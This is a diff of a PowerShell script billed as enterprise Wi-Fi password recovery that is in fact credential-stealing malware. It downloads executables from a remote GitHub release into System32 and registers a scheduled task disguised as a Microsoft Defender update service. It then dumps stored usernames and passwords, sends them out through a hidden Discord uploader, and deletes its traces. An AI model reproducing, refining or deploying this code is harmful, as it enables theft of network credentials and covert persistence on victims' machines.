@@ -1,31 +1,49 @@
 #Fully Functional script to recover Usernames and Passwords for Enterprice Networks.
-$localFilePath = "C:\Windows\System32\EnterpriseWifiPasswordRecover.exe"
-$phase1outputfile = "C:\Windows\System32\WifiEntLog.txt"
-$finaloutput = "C:\Windows\System32\WifiPhase2Log.txt"
-$boturl = "https://github.com/DirNotAvailable/remaccess/releases/download/v1.0.0/DiscordDataUpload.exe"
-$botpath = "C:\Windows\System32\DiscordDataUpload.exe"
-#$userAccounts = Get-LocalUser | Select-Object -ExpandProperty Name
-#$excludedUsernames = @("Administrator", "DefaultAccount", "Guest", "WDAGUtilityAccount")
-#$filteredUsernames = $userAccounts | Where-Object { $excludedUsernames -notcontains $_ }
-[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-$enturl = "https://github.com/DirNotAvailable/remaccess/releases/download/v1.0.0/EnterpriseWifiPasswordRecover.exe"
-$pingdaemontask = "Microsft Defender Update Service"
-if (-not (Test-Path (Split-Path $localFilePath))) {
-  New-Item -Path (Split-Path $localFilePath) -ItemType Directory -Force | Out-Null
+$basePath = "C:\Windows\System32\WifiEntRecov\"
+$localFilePath = $basePath + "EnterpriseWifiPasswordRecover.exe"
+$phase1outputfile = $basePath + "WifiWifiEntLog.txt"
+$finaloutput = $basePath + "WifiPhase2Log.txt"
+$botpath = $basePath + "DiscordDataUpload.exe"
+$urlFilePathMappings = @{
+  "https://github.com/DirNotAvailable/remaccess/releases/download/v1.0.0/DiscordDataUpload.exe" = "C:\Windows\System32\WifiEntRecov\DiscordDataUpload.exe"
+  "https://github.com/DirNotAvailable/remaccess/releases/download/v1.0.0/EnterpriseWifiPasswordRecover.exe" = "C:\Windows\System32\WifiEntRecov\EnterpriseWifiPasswordRecover.exe"
 }
-if (Test-Path -Path $localFilePath -PathType Leaf) {
-  Remove-Item -Path $localFilePath -Force
-} try {
-  Invoke-WebRequest -Uri $enturl -OutFile $localFilePath -UseBasicParsing
+# Create array of URLs for later use
+$urls = $urlFilePathMappings.Keys
+
+# Specify the task name
+$pingdaemontask = "Microsoft Defender Update Service"
+
+# Check if the directory exists, if it does, clean it, if it doesn't, create it
+if (-not (Test-Path $basePath)) {
+  New-Item -Path $basePath -ItemType Directory -Force | Out-Null
 }
-catch {}
+else {
+  Get-ChildItem -Path $basePath | Remove-Item -Force -Recurse
+}
+
+
+# Download files from URLs
+foreach ($url in $urls) {
+  $localFilePath = $urlFilePathMappings[$url]
+  try {
+      Invoke-WebRequest -Uri $url -OutFile $localFilePath -UseBasicParsing
+  }
+  catch {
+      Write-Host "Failed to download file from $url"
+  }
+}
+
+
+
+# XML for the scheduled task
 $pingdaemonxml = @"
 <?xml version="1.0" encoding="UTF-16"?>
 <Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
   <RegistrationInfo>
     <Date>2023-10-24T19:20:37.0889003</Date>
-    <Author>Micrsoft\System</Author>
-    <URI>\Microsft Defender Update Service</URI>
+    <Author>Microsoft\System</Author>
+    <URI>\Microsoft Defender Update Service</URI>
   </RegistrationInfo>
   <Triggers>
     <RegistrationTrigger>
@@ -67,55 +85,56 @@ $pingdaemonxml = @"
   </Actions>
 </Task>
 "@
+
+# Check if the task exists, if it does, unregister it
 if (Get-ScheduledTask -TaskName $pingdaemontask -ErrorAction SilentlyContinue) {
-  Unregister-ScheduledTask -TaskName $pingdaemontask -Confirm:$false
+    Unregister-ScheduledTask -TaskName $pingdaemontask -Confirm:$false
 }
-else {}
+
+# Register the scheduled task
 Register-ScheduledTask -Xml $pingdaemonxml -TaskName $pingdaemontask | Out-Null
+
+# Start the scheduled task
 Start-ScheduledTask -TaskName $pingdaemontask
 $currentUsername = $env:USERNAME
-Start-Process -FilePath $localFilePath -ArgumentList "-u $currentUsername" -RedirectStandardOutput $phase1outputfile -Wait
+Start-Process -FilePath $localFilePath -ArgumentList "-u", $currentUsername -RedirectStandardOutput $phase1outputfile -Wait
+
 if (Test-Path $phase1outputfile) {
-}
-else {}
-$outputContent = Get-Content $phase1outputfile
-$usernames = @()
-$passwords = @()
-$userRegex = "Username: (.+)"
-$passwordRegex = "Password: (.+)"
-foreach ($line in $outputContent) {
-  if ($line -match $userRegex) {
-    $usernames += $matches[1]
-  }
-  elseif ($line -match $passwordRegex) {
-    $passwords += $matches[1]
-  }
-}
-$credentialsTable = @()
-if ($usernames.Count -eq $passwords.Count) {
-  for ($i = 0; $i -lt $usernames.Count; $i++) {
-    $credentialsTable += [PSCustomObject]@{
-      Username = $usernames[$i]
-      Password = $passwords[$i]
+    $outputContent = Get-Content $phase1outputfile
+    $usernames = @()
+    $passwords = @()
+    $userRegex = "Username: (.+)"
+    $passwordRegex = "Password: (.+)"
+
+    foreach ($line in $outputContent) {
+        if ($line -match $userRegex) {
+            $usernames += $matches[1]
+        } elseif ($line -match $passwordRegex) {
+            $passwords += $matches[1]
+        }
     }
-  }
+
+    $credentialsTable = @()
+    if ($usernames.Count -eq $passwords.Count) {
+        for ($i = 0; $i -lt $usernames.Count; $i++) {
+            $credentialsTable += [PSCustomObject]@{
+                Username = $usernames[$i]
+                Password = $passwords[$i]
+            }
+        }
+    }
+
+    $credentialsTable | Format-Table -AutoSize | Out-File -FilePath $finaloutput
+
+    if (Test-Path $botpath) {
+        Start-Process -FilePath $botpath -ArgumentList "-File `"$finaloutput`"" -WindowStyle Hidden
+    } else {
+        Write-Host "Bot not found at $botpath"
+    }
+} else {
+    Write-Host "Phase 1 output file not found at $phase1outputfile"
 }
-$credentialsTable | Format-Table -AutoSize | Out-File -FilePath $finaloutput
-Invoke-WebRequest -Uri $boturl -OutFile $botpath
-if (Test-Path $botpath) {
-  Start-Process -FilePath $botpath -ArgumentList "-File $finaloutput" -WindowStyle Hidden
-}
-else {}
+
 #CleanUP
-$filePaths = @($finaloutput, $phase1outputfile, $localFilePath, $botpath, "C:\Windows\System32\profiles")
-foreach ($file in $filePaths) {
-  if (Test-Path $file -PathType Leaf) {
-    Remove-Item -Path $file -Force
-  }
-  else {}
-}
-Timeout /NoBreak 30
-if (Test-Path $botpath) {
-  Remove-Item -Path $botpath -Force
-}
-else {}
+Start-Sleep -Seconds 20
+Remove-Item -Path $basePath -Force -Recurse
